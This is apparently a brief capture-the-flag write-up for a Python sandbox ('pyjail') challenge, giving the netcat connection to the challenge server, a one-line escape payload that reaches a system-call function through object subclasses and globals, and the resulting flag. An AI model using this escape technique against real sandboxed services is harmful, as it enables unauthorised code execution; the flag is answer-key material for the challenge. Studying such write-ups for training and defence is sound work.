# Virus Attack
> One day they woke me up, so I could live forever But immortality's a curse, now forever I'll endure

## About the Challenge
This chall is about pyjail. We need to connect first to `nc misc.bbctf.fluxus.co.in 2001` and then escape from python sandbox

## How to Solve?
To escape the python sandbox, the payload will looks like this
```python
[*().__class__.__base__.__subclasses__()[50+50+37].__init__.__globals__.values()][47]([].__doc__[5+5+7::79])
```
Inspired by https://okman.gitbook.io/okman-writeups/miscellaneous-challenges/redpwnctf-albatross writeup, but there are some modification because the program will not run if we input number `1` and `8`.

```
flag{S0_YoU_KN0W_How_70_m0d1fy_vARi@bl35_1n_Py}
```